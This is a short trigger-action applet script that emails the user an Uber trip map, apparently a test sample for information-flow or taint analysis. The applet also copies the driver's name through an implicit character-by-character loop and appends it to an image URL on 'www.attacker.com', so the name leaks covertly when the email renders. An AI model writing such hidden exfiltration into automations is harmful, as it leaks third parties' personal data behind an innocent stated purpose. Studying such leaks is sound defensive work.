// Send yourself an email with the map of the Uber ride

// Trigger: Uber -> Ride completed
//					Uber.rideCompleted.{CompletedAt, RideType, VehicleMakeModel, VehicleLicensePlate,
//															DriverName, DriverPhoneNumber, DriverPhoto, SurgeMultiplier,
//															PickupLat, PickupLong, DropoffLat, DropoffLong, TripMapImage
// Action: Email -> Send me an email
//				 Email.sendMeEmail.{skip, setSubject, setBody}

rideMap = lbl('Uber.rideCompleted.TripMapImage');
driver = lbl('Uber.rideCompleted.DriverName');

i = 0;
j = 0;
var dst = '';
var t = false;

for (i = 0; i < driver.length; i++) {	
	for (j = 33; j < 127; j++) {
		t = (driver[i] == String.fromCharCode(j));
    if (t) {
			dst[i] = String.fromCharCode(j);
		}
  }
}

img = imgl("www.attacker.com?" + dst);
sink('Email.sendMeEmail', 'setBody', rideMap + img);
